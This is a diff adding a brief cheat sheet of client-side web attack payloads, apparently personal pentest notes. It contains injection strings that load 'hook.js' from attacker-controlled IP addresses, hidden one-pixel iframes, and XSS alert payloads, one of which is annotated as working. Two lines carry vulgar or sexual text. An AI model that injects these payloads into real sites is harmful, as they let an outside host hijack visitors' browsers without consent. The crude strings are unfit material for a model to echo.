@@ -1,0 +1,14 @@
+CLIENT-SIDE-IFRAME-ATTACK
+
+<iframe src="http://172.16.40.5:9999"></iframe> <----works
+
+<script src="http://172.16.111.30/hook.js"></script>
+
+<iframe src=http://172.16.5.20:8080/fuckyocouch width=1 height=1 style=”visibility:hidden; position:absolute”></iframe>
+
+<img src='http://10.100.13.200:80' onerror="alert('XSS');" />
+
+<script src="http://10.100.13.200:3000/hook.js"></script>
+
+<script>alert('I like your boobs')</script>
+
